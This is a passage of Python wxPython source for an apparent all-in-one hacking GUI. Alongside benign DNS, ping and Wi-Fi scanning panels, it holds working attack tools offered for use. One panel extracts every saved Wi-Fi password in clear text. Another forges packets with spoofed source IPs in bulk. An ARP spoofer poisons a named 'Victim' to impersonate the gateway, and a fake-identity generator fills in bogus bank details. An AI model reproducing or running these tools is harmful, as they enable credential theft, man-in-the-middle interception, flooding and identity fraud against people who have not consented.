        hbox.Add(wx.StaticText(panel, label="Domain:"), 0, wx.ALL | wx.CENTER, 5)
        self.dns_domain_input = wx.TextCtrl(panel)
        hbox.Add(self.dns_domain_input, 1, wx.ALL | wx.EXPAND, 5)
        query_btn = wx.Button(panel, label="Query DNS")
        query_btn.Bind(wx.EVT_BUTTON, self.on_dns_query)
        hbox.Add(query_btn, 0, wx.ALL, 5)
        vbox.Add(hbox, 0, wx.EXPAND)

        # Results table
        self.dns_result_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.dns_result_table.InsertColumn(0, "Record Type", width=100)
        self.dns_result_table.InsertColumn(1, "Record Value", width=450)
        vbox.Add(self.dns_result_table, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(vbox)
        return panel

    def on_dns_query(self, event):
        domain = self.dns_domain_input.GetValue().strip()
        if not domain:
            wx.MessageBox("Please enter a domain to query.", "Error", wx.ICON_ERROR)
            return

        self.dns_result_table.DeleteAllItems()
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]

        resolver = dns.resolver.Resolver()
        for rtype in record_types:
            try:
                answers = resolver.resolve(domain, rtype, lifetime=5)
                for rdata in answers:
                    idx = self.dns_result_table.InsertItem(self.dns_result_table.GetItemCount(), rtype)
                    self.dns_result_table.SetItem(idx, 1, str(rdata))
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
                # No records or domain does not exist, just skip
                continue
            except Exception as e:
                wx.MessageBox(f"Error querying {rtype}: {e}", "Error", wx.ICON_ERROR)
                break

    def create_google_dork_helper_panel(self):
        panel = wx.Panel(self.content_panel)
        vbox = wx.BoxSizer(wx.VERTICAL)

        # Base search term input
        vbox.Add(wx.StaticText(panel, label="Base Keywords/Phrase:"), 0, wx.ALL, 5)
        self.gd_base_input = wx.TextCtrl(panel)
        vbox.Add(self.gd_base_input, 0, wx.ALL | wx.EXPAND, 5)

        # Operators section
        ops_box = wx.StaticBox(panel, label="Google Dork Operators")
        ops_sizer = wx.StaticBoxSizer(ops_box, wx.VERTICAL)

        self.gd_site_input = wx.TextCtrl(panel)
        self.gd_filetype_input = wx.TextCtrl(panel)
        self.gd_inurl_input = wx.TextCtrl(panel)
        self.gd_intitle_input = wx.TextCtrl(panel)
        self.gd_intext_input = wx.TextCtrl(panel)

        grid = wx.FlexGridSizer(5, 2, 5, 5)
        grid.AddMany([
            (wx.StaticText(panel, label="site:"), 0, wx.ALIGN_CENTER_VERTICAL),
            (self.gd_site_input, 1, wx.EXPAND),
            (wx.StaticText(panel, label="filetype:"), 0, wx.ALIGN_CENTER_VERTICAL),
            (self.gd_filetype_input, 1, wx.EXPAND),
            (wx.StaticText(panel, label="inurl:"), 0, wx.ALIGN_CENTER_VERTICAL),
            (self.gd_inurl_input, 1, wx.EXPAND),
            (wx.StaticText(panel, label="intitle:"), 0, wx.ALIGN_CENTER_VERTICAL),
            (self.gd_intitle_input, 1, wx.EXPAND),
            (wx.StaticText(panel, label="intext:"), 0, wx.ALIGN_CENTER_VERTICAL),
            (self.gd_intext_input, 1, wx.EXPAND),
        ])
        ops_sizer.Add(grid, 1, wx.EXPAND | wx.ALL, 5)

        vbox.Add(ops_sizer, 0, wx.ALL | wx.EXPAND, 10)

        # Generate button
        generate_btn = wx.Button(panel, label="Generate Google Dork")
        generate_btn.Bind(wx.EVT_BUTTON, self.on_generate_google_dork)
        vbox.Add(generate_btn, 0, wx.ALL | wx.CENTER, 10)

        # Result output (read-only multiline text)
        self.gd_result_output = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        vbox.Add(self.gd_result_output, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(vbox)
        return panel

    def on_generate_google_dork(self, event):
        base = self.gd_base_input.GetValue().strip()
        parts = []

        if base:
            parts.append(base)

        site = self.gd_site_input.GetValue().strip()
        if site:
            parts.append(f"site:{site}")

        filetype = self.gd_filetype_input.GetValue().strip()
        if filetype:
            parts.append(f"filetype:{filetype}")

        inurl = self.gd_inurl_input.GetValue().strip()
        if inurl:
            parts.append(f"inurl:{inurl}")

        intitle = self.gd_intitle_input.GetValue().strip()
        if intitle:
            parts.append(f"intitle:{intitle}")

        intext = self.gd_intext_input.GetValue().strip()
        if intext:
            parts.append(f"intext:{intext}")

        query = " ".join(parts)
        self.gd_result_output.SetValue(query)

    def create_network_info_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Button to get info
        self.refresh_netinfo_button = wx.Button(panel, label="Show Full Network Info")
        self.refresh_netinfo_button.Bind(wx.EVT_BUTTON, self.on_refresh_netinfo)
        sizer.Add(self.refresh_netinfo_button, 0, wx.ALL | wx.ALIGN_LEFT, 10)

        # Table to show the data
        self.netinfo_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.netinfo_table.InsertColumn(0, "Field", width=250)
        self.netinfo_table.InsertColumn(1, "Value", width=450)
        sizer.Add(self.netinfo_table, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_refresh_netinfo(self, event):
        self.netinfo_table.DeleteAllItems()

        def add_row(field, value):
            index = self.netinfo_table.InsertItem(self.netinfo_table.GetItemCount(), field)
            self.netinfo_table.SetItem(index, 1, value)

        # IP config
        try:
            result = subprocess.check_output(["netsh", "interface", "ip", "show", "config"], text=True, encoding='utf-8', errors='ignore')
            add_row("--- Network Interface IP Config ---", "")
            for line in result.splitlines():
                if ":" in line:
                    key, val = map(str.strip, line.split(":", 1))
                    add_row(key, val)
        except Exception as e:
            add_row("Error (IP Config)", str(e))

        # Wi-Fi profiles
        try:
            profile_result = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, encoding='utf-8', errors='ignore')
            add_row("--- Saved Wi-Fi Profiles ---", "")
            profiles = []
            for line in profile_result.splitlines():
                if "All User Profile" in line:
                    profile_name = line.split(":", 1)[1].strip()
                    profiles.append(profile_name)
                    add_row("Profile", profile_name)

            # Get password for each profile
            for profile in profiles:
                try:
                    password_result = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                        text=True, encoding='utf-8', errors='ignore'
                    )
                    for line in password_result.splitlines():
                        if "Key Content" in line:
                            password = line.split(":", 1)[1].strip()
                            add_row(f"Password for {profile}", password)
                except Exception as pe:
                    add_row(f"Password for {profile}", "Error or not available")
        except Exception as e:
            add_row("Error (Wi-Fi Profiles)", str(e))

    def create_raw_packet_forge_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        grid = wx.FlexGridSizer(rows=7, cols=2, hgap=10, vgap=10)
        grid.AddGrowableCol(1, 1)

        # Input fields
        labels = [
            "Destination IP:", "Source IP:",
            "Destination Port:", "Source Port:",
            "Protocol (TCP/UDP):", "Payload:", "Send Count:"
        ]
        self.raw_inputs = {}

        for label in labels:
            lbl = wx.StaticText(panel, label=label)
            txt = wx.TextCtrl(panel)
            self.raw_inputs[label] = txt
            grid.Add(lbl, 0, wx.ALIGN_CENTER_VERTICAL)
            grid.Add(txt, 1, wx.EXPAND)

        sizer.Add(grid, 0, wx.ALL | wx.EXPAND, 10)

        # Send Button
        send_button = wx.Button(panel, label="Send Packet")
        send_button.Bind(wx.EVT_BUTTON, self.on_send_raw_packet)
        sizer.Add(send_button, 0, wx.ALL | wx.ALIGN_CENTER_HORIZONTAL, 10)

        # Status Box
        self.raw_status = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.raw_status, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_send_raw_packet(self, event):
        try:
            dst_ip = self.raw_inputs["Destination IP:"].GetValue()
            src_ip = self.raw_inputs["Source IP:"].GetValue()
            dst_port = int(self.raw_inputs["Destination Port:"].GetValue())
            src_port = int(self.raw_inputs["Source Port:"].GetValue())
            protocol = self.raw_inputs["Protocol (TCP/UDP):"].GetValue().strip().upper()
            payload = self.raw_inputs["Payload:"].GetValue().encode()
            count = int(self.raw_inputs["Send Count:"].GetValue())

            ip_layer = IP(dst=dst_ip, src=src_ip)

            if protocol == "TCP":
                transport_layer = TCP(dport=dst_port, sport=src_port)
            elif protocol == "UDP":
                transport_layer = UDP(dport=dst_port, sport=src_port)
            else:
                self.raw_status.AppendText("Invalid protocol. Use TCP or UDP.\n")
                return

            packet = ip_layer / transport_layer / payload
            send(packet, count=count, verbose=False)

            self.raw_status.AppendText(f"Sent {count} packets to {dst_ip}:{dst_port} over {protocol}.\n")

        except Exception as e:
            self.raw_status.AppendText(f"Error: {str(e)}\n")

    def create_arp_spoofer_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        grid = wx.FlexGridSizer(rows=4, cols=2, hgap=10, vgap=10)
        grid.AddGrowableCol(1, 1)

        # Interface Dropdown
        grid.Add(wx.StaticText(panel, label="Select Interface:"), 0, wx.ALIGN_CENTER_VERTICAL)
        nic_list = get_nic_display_list()
        # Store raw_if names internally for later use, show display names to user
        self.nic_map = {display: raw for raw, display in nic_list}
        choices = [display for _, display in nic_list]
        self.arp_iface_choice = wx.Choice(panel, choices=choices)
        grid.Add(self.arp_iface_choice, 1, wx.EXPAND)

        # Target IP
        grid.Add(wx.StaticText(panel, label="Target IP (Victim):"), 0, wx.ALIGN_CENTER_VERTICAL)
        self.arp_target_ip = wx.TextCtrl(panel)
        grid.Add(self.arp_target_ip, 1, wx.EXPAND)

        # Spoofed IP
        grid.Add(wx.StaticText(panel, label="Spoofed IP (Gateway):"), 0, wx.ALIGN_CENTER_VERTICAL)
        self.arp_spoof_ip = wx.TextCtrl(panel)
        grid.Add(self.arp_spoof_ip, 1, wx.EXPAND)

        sizer.Add(grid, 0, wx.ALL | wx.EXPAND, 10)

        # Start/Stop Buttons
        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.arp_start_btn = wx.Button(panel, label="Start Spoofing")
        self.arp_stop_btn = wx.Button(panel, label="Stop Spoofing")
        self.arp_stop_btn.Disable()
        btn_sizer.Add(self.arp_start_btn, 1, wx.ALL, 5)
        btn_sizer.Add(self.arp_stop_btn, 1, wx.ALL, 5)
        sizer.Add(btn_sizer, 0, wx.ALIGN_CENTER)

        # Status box
        self.arp_status = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.arp_status, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)

        # Bindings
        self.arp_start_btn.Bind(wx.EVT_BUTTON, self.on_start_arp_spoof)
        self.arp_stop_btn.Bind(wx.EVT_BUTTON, self.on_stop_arp_spoof)

        self.arp_spoofing = False
        return panel
    
    def on_start_arp_spoof(self, event):
        iface = self.arp_iface_choice.GetStringSelection()
        target_ip = self.arp_target_ip.GetValue()
        spoof_ip = self.arp_spoof_ip.GetValue()

        if not iface or not target_ip or not spoof_ip:
            self.arp_status.AppendText("Please fill all fields.\n")
            return

        self.arp_spoofing = True
        self.arp_start_btn.Disable()
        self.arp_stop_btn.Enable()
        self.arp_status.AppendText(f"Started ARP spoofing on {target_ip}, spoofing {spoof_ip}...\n")

        self.arp_thread = threading.Thread(target=self.arp_spoof_loop, args=(iface, target_ip, spoof_ip), daemon=True)
        self.arp_thread.start()

    def on_stop_arp_spoof(self, event):
        self.arp_spoofing = False
        self.arp_start_btn.Enable()
        self.arp_stop_btn.Disable()
        self.arp_status.AppendText("Stopped ARP spoofing.\n")

    def arp_spoof_loop(self, iface, target_ip, spoof_ip):
        conf.iface = iface
        try:
            while self.arp_spoofing:
                pkt = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst="ff:ff:ff:ff:ff:ff")
                send(pkt, verbose=False)
                wx.CallAfter(self.arp_status.AppendText, f"Sent spoofed ARP to {target_ip} claiming to be {spoof_ip}\n")
                time.sleep(2)
        except Exception as e:
            wx.CallAfter(self.arp_status.AppendText, f"Error: {str(e)}\n")

    def create_wifi_viewer_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Refresh button
        self.wifi_refresh_btn = wx.Button(panel, label="Scan WiFi Networks")
        self.wifi_refresh_btn.Bind(wx.EVT_BUTTON, self.scan_wifi_networks)
        sizer.Add(self.wifi_refresh_btn, 0, wx.ALL | wx.CENTER, 10)

        # WiFi network list (as ListCtrl)
        self.wifi_list = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        cols = ["SSID", "Signal", "Security", "Channel", "BSSID"]
        for i, col in enumerate(cols):
            self.wifi_list.InsertColumn(i, col)
            self.wifi_list.SetColumnWidth(i, 150)

        sizer.Add(self.wifi_list, 1, wx.EXPAND | wx.ALL, 10)
        panel.SetSizer(sizer)
        return panel

    def scan_wifi_networks(self, event=None):
        self.wifi_list.DeleteAllItems()

        try:
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'], encoding='utf-8')
            networks = result.split('\n')

            ssid = ""
            security = ""
            channel = ""
            bssid = ""
            signal = ""

            for line in networks:
                line = line.strip()
                if line.startswith("SSID"):
                    ssid = line.split(":", 1)[1].strip()
                elif line.startswith("Authentication"):
                    security = line.split(":", 1)[1].strip()
                elif line.startswith("Signal"):
                    signal = line.split(":", 1)[1].strip()
                elif line.startswith("Channel"):
                    channel = line.split(":", 1)[1].strip()
                elif line.startswith("BSSID"):
                    bssid = line.split(":", 1)[1].strip()
                    # Add one entry per BSSID found
                    index = self.wifi_list.InsertItem(self.wifi_list.GetItemCount(), ssid)
                    self.wifi_list.SetItem(index, 1, signal)
                    self.wifi_list.SetItem(index, 2, security)
                    self.wifi_list.SetItem(index, 3, channel)
                    self.wifi_list.SetItem(index, 4, bssid)
        except subprocess.CalledProcessError as e:
            wx.MessageBox("Failed to scan networks:\n" + str(e), "Error", wx.ICON_ERROR)

    def create_netbios_scanner_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_label = wx.StaticText(panel, label="Target IP Range (e.g., 192.168.1.0/24):")
        self.netbios_input = wx.TextCtrl(panel)
        self.netbios_scan_button = wx.Button(panel, label="Scan")

        input_sizer.Add(input_label, 0, wx.ALL | wx.CENTER, 5)
        input_sizer.Add(self.netbios_input, 1, wx.ALL | wx.EXPAND, 5)
        input_sizer.Add(self.netbios_scan_button, 0, wx.ALL, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        self.netbios_results = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        columns = ["IP Address", "NetBIOS Name", "MAC Address"]
        for i, col in enumerate(columns):
            self.netbios_results.InsertColumn(i, col)
            self.netbios_results.SetColumnWidth(i, 200)

        sizer.Add(self.netbios_results, 1, wx.ALL | wx.EXPAND, 10)

        self.netbios_scan_button.Bind(wx.EVT_BUTTON, self.on_netbios_scan)

        panel.SetSizer(sizer)
        return panel

    def on_netbios_scan(self, event):
        ip_range = self.netbios_input.GetValue()
        self.netbios_results.DeleteAllItems()

        try:
            ips = list(ipaddress.IPv4Network(ip_range, strict=False))
        except ValueError:
            wx.MessageBox("Invalid IP range", "Error", wx.ICON_ERROR)
            return

        threading.Thread(target=self._scan_netbios_range, args=(ips,), daemon=True).start()

    def _scan_netbios_range(self, ip_list):
        bios = NetBIOS()
        for ip in ip_list:
            ip_str = str(ip)
            try:
                name = bios.queryIPForName(ip_str, timeout=1)
                if name:
                    wx.CallAfter(self._add_netbios_result, ip_str, name[0])
            except Exception:
                continue

    def _add_netbios_result(self, ip, name):
        index = self.netbios_results.InsertItem(self.netbios_results.GetItemCount(), ip)
        self.netbios_results.SetItem(index, 1, name)
        self.netbios_results.SetItem(index, 2, "Unknown")

    def get_mac(ip):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(pkt, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv.hwsrc
        return "Unknown"

    def create_webhook_embed_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        def labeled_input(label, attr_name, multiline=False):
            box = wx.BoxSizer(wx.HORIZONTAL)
            static_label = wx.StaticText(panel, label=label)
            style = wx.TE_MULTILINE if multiline else 0
            ctrl = wx.TextCtrl(panel, style=style)
            setattr(self, attr_name, ctrl)
            box.Add(static_label, 0, wx.ALL | wx.CENTER, 5)
            box.Add(ctrl, 1, wx.ALL | wx.EXPAND, 5)
            sizer.Add(box, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        labeled_input("Webhook URL:", "webhook_url_input")
        labeled_input("Embed Title:", "embed_title_input")
        labeled_input("Embed Description:", "embed_desc_input", multiline=True)
        labeled_input("Embed Footer:", "embed_footer_input")
        labeled_input("Image URL (optional):", "embed_image_input")

        # Color input
        color_box = wx.BoxSizer(wx.HORIZONTAL)
        color_label = wx.StaticText(panel, label="Embed Color (#rrggbb):")
        self.embed_color_input = wx.TextCtrl(panel, value="#ff0000")
        color_box.Add(color_label, 0, wx.ALL | wx.CENTER, 5)
        color_box.Add(self.embed_color_input, 1, wx.ALL | wx.EXPAND, 5)
        sizer.Add(color_box, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Send Button
        self.send_embed_button = wx.Button(panel, label="Send Embed")
        self.send_embed_button.Bind(wx.EVT_BUTTON, self.on_send_embed_clicked)
        sizer.Add(self.send_embed_button, 0, wx.ALL | wx.CENTER, 10)

        # Log box
        self.webhook_log_output = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        sizer.Add(self.webhook_log_output, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    # Send logic
    def on_send_embed_clicked(self, event):
        url = self.webhook_url_input.GetValue().strip()
        title = self.embed_title_input.GetValue().strip()
        desc = self.embed_desc_input.GetValue().strip()
        footer = self.embed_footer_input.GetValue().strip()
        image = self.embed_image_input.GetValue().strip()
        color_hex = self.embed_color_input.GetValue().strip()

        if not url or not title or not desc:
            wx.MessageBox("Webhook URL, title, and description are required.", "Input Error", wx.ICON_WARNING)
            return

        if not is_valid_hex_color(color_hex):
            wx.MessageBox("Color must be a valid hex code (e.g., #ff0000).", "Invalid Color", wx.ICON_ERROR)
            return

        color = hex_to_int_color(color_hex)
        payload = create_embed_payload(title, desc, color, footer, image)

        threading.Thread(target=self.send_webhook_embed, args=(url, payload)).start()

    def send_webhook_embed(self, url, payload):
        headers = {"Content-Type": "application/json"}

        try:
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code in (200, 204):
                wx.CallAfter(self.webhook_log_output.AppendText, f"[+] Embed sent successfully.\n")
            else:
                wx.CallAfter(self.webhook_log_output.AppendText, f"[!] Failed: {response.status_code} {response.text}\n")
        except Exception as e:
            wx.CallAfter(self.webhook_log_output.AppendText, f"[!] Error: {e}\n")

    def create_ip_range_scanner_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input Fields
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_sizer.Add(wx.StaticText(panel, label="Start IP:"), 0, wx.ALL | wx.CENTER, 5)
        self.start_ip_input = wx.TextCtrl(panel)
        input_sizer.Add(self.start_ip_input, 1, wx.ALL | wx.EXPAND, 5)

        input_sizer.Add(wx.StaticText(panel, label="End IP:"), 0, wx.ALL | wx.CENTER, 5)
        self.end_ip_input = wx.TextCtrl(panel)
        input_sizer.Add(self.end_ip_input, 1, wx.ALL | wx.EXPAND, 5)

        self.scan_button = wx.Button(panel, label="Scan Range")
        self.scan_button.Bind(wx.EVT_BUTTON, self.on_scan_range_clicked)
        input_sizer.Add(self.scan_button, 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)

        sizer.Add(input_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 10)

        # Results Table
        self.range_result_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.range_result_table.InsertColumn(0, "IP Address", width=200)
        self.range_result_table.InsertColumn(1, "Status", width=100)
        self.range_result_table.InsertColumn(2, "Latency", width=100)
        sizer.Add(self.range_result_table, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(sizer)
        return panel

    def on_scan_range_clicked(self, event):
        import ipaddress
        import threading
        import subprocess
        import platform
        import time

        # Define ping_ip inside this method
        def ping_ip(ip):
            param = "-n" if platform.system().lower() == "windows" else "-c"
            command = ["ping", param, "1", str(ip)]
            try:
                output = subprocess.check_output(command, stderr=subprocess.DEVNULL, universal_newlines=True, timeout=2)
                if "TTL=" in output or "ttl=" in output:
                    for line in output.splitlines():
                        if "time=" in line.lower():
                            return True, line.split("time=")[-1].split()[0]
                    return True, "?"
            except:
                return False, None
            return False, None

        start_ip = self.start_ip_input.GetValue().strip()
        end_ip = self.end_ip_input.GetValue().strip()
        self.range_result_table.DeleteAllItems()

        try:
            ip_start = ipaddress.IPv4Address(start_ip)
            ip_end = ipaddress.IPv4Address(end_ip)
        except ipaddress.AddressValueError:
            wx.MessageBox("Invalid IP address format.", "Error", wx.ICON_ERROR)
            return

        if ip_start > ip_end:
            wx.MessageBox("Start IP must be less than or equal to End IP.", "Error", wx.ICON_ERROR)
            return

        def scan():
            for ip_int in range(int(ip_start), int(ip_end) + 1):
                ip = str(ipaddress.IPv4Address(ip_int))
                alive, latency = ping_ip(ip)
                wx.CallAfter(self.add_range_result, ip, "Online" if alive else "Offline", latency or "-")
                time.sleep(0.05)  # Small delay to prevent flooding

        threading.Thread(target=scan, daemon=True).start()

    def add_range_result(self, ip, status, latency):
        index = self.range_result_table.InsertItem(self.range_result_table.GetItemCount(), ip)
        self.range_result_table.SetItem(index, 1, status)
        self.range_result_table.SetItem(index, 2, latency)


    def create_fake_identity_panel(self):
        panel = wx.Panel(self.content_panel)
        vbox = wx.BoxSizer(wx.VERTICAL)

        # Generate fake data
        first_name = fake.first_name()
        middle_name = fake.first_name()
        last_name = fake.last_name()
        dob = fake.date_of_birth(minimum_age=18, maximum_age=90).strftime("%m-%d-%Y")
        address = fake.address().replace("\n", ", ")
        gender = fake.random_element(elements=("Male", "Female", "Other"))
        language = fake.language_name()

        # Header: Bold First, Last Name and DOB on right
        header_sizer = wx.BoxSizer(wx.HORIZONTAL)

        name_text = wx.StaticText(panel, label=f"{first_name}, {last_name}")
        font_bold = name_text.GetFont()
        font_bold = font_bold.Bold()
        name_text.SetFont(font_bold)

        dob_text = wx.StaticText(panel, label=dob)
        dob_text.SetFont(font_bold)

        header_sizer.Add(name_text, 0, wx.LEFT | wx.ALIGN_CENTER_VERTICAL, 10)
        header_sizer.AddStretchSpacer()
        header_sizer.Add(dob_text, 0, wx.RIGHT | wx.ALIGN_CENTER_VERTICAL, 10)

        vbox.Add(header_sizer, 0, wx.EXPAND | wx.TOP | wx.BOTTOM, 5)
        vbox.Add(wx.StaticLine(panel), 0, wx.EXPAND)

        # Tabs
        notebook = wx.Notebook(panel)

        def make_bold_label(parent, text):
            lbl = wx.StaticText(parent, label=text)
            font = lbl.GetFont()
            font = font.Bold()
            lbl.SetFont(font)
            return lbl

        # --- Fake Profile tab ---
        profile_panel = wx.Panel(notebook)
        profile_sizer = wx.BoxSizer(wx.VERTICAL)

        profile_grid = wx.FlexGridSizer(0, 4, 10, 20)  # 0 rows, 4 cols (auto rows)
        profile_grid.Add(make_bold_label(profile_panel, "Name:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        profile_grid.Add(wx.StaticText(profile_panel, label=f"{first_name} {middle_name} {last_name}"), 0, wx.ALIGN_LEFT)
        profile_grid.Add(make_bold_label(profile_panel, "DOB:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        profile_grid.Add(wx.StaticText(profile_panel, label=dob))

        profile_grid.Add(make_bold_label(profile_panel, "Address:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        profile_grid.Add(wx.StaticText(profile_panel, label=address), 0, wx.ALIGN_LEFT)
        profile_grid.Add(make_bold_label(profile_panel, "Sex:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        profile_grid.Add(wx.StaticText(profile_panel, label=gender))

        profile_grid.Add(make_bold_label(profile_panel, "Language:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        profile_grid.Add(wx.StaticText(profile_panel, label=language))
        profile_grid.Add((0, 0))  # empty cell
        profile_grid.Add((0, 0))  # empty cell

        profile_sizer.Add(profile_grid, 0, wx.ALL, 15)
        profile_panel.SetSizer(profile_sizer)
        notebook.AddPage(profile_panel, "Fake Profile")

        # --- Fake Social Medias tab ---
        social_panel = wx.Panel(notebook)
        social_sizer = wx.BoxSizer(wx.VERTICAL)

        social_grid = wx.FlexGridSizer(0, 2, 10, 20)  # 0 rows, 2 cols
        social_grid.Add(make_bold_label(social_panel, "Twitter:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        social_grid.Add(wx.StaticText(social_panel, label=f"@{fake.user_name()}"))
        social_grid.Add(make_bold_label(social_panel, "Instagram:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        social_grid.Add(wx.StaticText(social_panel, label=f"@{fake.user_name()}"))
        social_grid.Add(make_bold_label(social_panel, "Facebook:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        social_grid.Add(wx.StaticText(social_panel, label=f"{fake.first_name()}.{fake.last_name()}"))
        social_grid.Add(make_bold_label(social_panel, "LinkedIn:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        social_grid.Add(wx.StaticText(social_panel, label=f"{fake.first_name()} {fake.last_name()}"))

        social_sizer.Add(social_grid, 0, wx.ALL, 15)
        social_panel.SetSizer(social_sizer)
        notebook.AddPage(social_panel, "Fake Social Medias")

        # --- Fake Wifi Information tab ---
        wifi_panel = wx.Panel(notebook)
        wifi_sizer = wx.BoxSizer(wx.VERTICAL)

        wifi_grid = wx.FlexGridSizer(0, 2, 10, 20)
        wifi_grid.Add(make_bold_label(wifi_panel, "SSID:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        wifi_grid.Add(wx.StaticText(wifi_panel, label=f"{fake.word().capitalize()}_WiFi"))
        wifi_grid.Add(make_bold_label(wifi_panel, "BSSID:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        wifi_grid.Add(wx.StaticText(wifi_panel, label=f"{fake.mac_address()}"))
        wifi_grid.Add(make_bold_label(wifi_panel, "IP Address:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        wifi_grid.Add(wx.StaticText(wifi_panel, label=f"{fake.ipv4()}"))
        wifi_grid.Add(make_bold_label(wifi_panel, "Signal Strength:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        wifi_grid.Add(wx.StaticText(wifi_panel, label=f"{fake.random_int(min=20, max=100)}%"))

        wifi_sizer.Add(wifi_grid, 0, wx.ALL, 15)
        wifi_panel.SetSizer(wifi_sizer)
        notebook.AddPage(wifi_panel, "Fake Wifi Information")

        # --- Fake Employment & Education tab ---
        emp_panel = wx.Panel(notebook)
        emp_sizer = wx.BoxSizer(wx.VERTICAL)

        emp_grid = wx.FlexGridSizer(0, 2, 10, 20)  # 0 rows, 2 cols
        emp_grid.Add(make_bold_label(emp_panel, "Company:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        emp_grid.Add(wx.StaticText(emp_panel, label=fake.company()))
        emp_grid.Add(make_bold_label(emp_panel, "Position:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        emp_grid.Add(wx.StaticText(emp_panel, label=fake.job()))
        emp_grid.Add(make_bold_label(emp_panel, "Start Year:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        emp_grid.Add(wx.StaticText(emp_panel, label=str(fake.year())))
        emp_grid.Add(make_bold_label(emp_panel, "End Year:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        emp_grid.Add(wx.StaticText(emp_panel, label=str(fake.year())))
        emp_grid.Add(make_bold_label(emp_panel, "Graduation Year:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        emp_grid.Add(wx.StaticText(emp_panel, label=str(fake.year())))

        emp_sizer.Add(emp_grid, 0, wx.ALL, 15)
        emp_panel.SetSizer(emp_sizer)
        notebook.AddPage(emp_panel, "Employment & Education")

        # --- Fake Financial Information tab ---
        fin_panel = wx.Panel(notebook)
        fin_sizer = wx.BoxSizer(wx.VERTICAL)

        fin_grid = wx.FlexGridSizer(0, 2, 10, 20)
        fin_grid.Add(make_bold_label(fin_panel, "Bank Name:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        fin_grid.Add(wx.StaticText(fin_panel, label=fake.company()))
        fin_grid.Add(make_bold_label(fin_panel, "Account Number:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
        fin_grid.Add(wx.StaticText(fin_panel, label=fake.bban()))
        fin_grid.Add(make_bold_label(fin_panel, "Routing Number:"), 0, wx.ALIGN_RIGHT | wx.ALIGN_CENTER_VERTICAL)
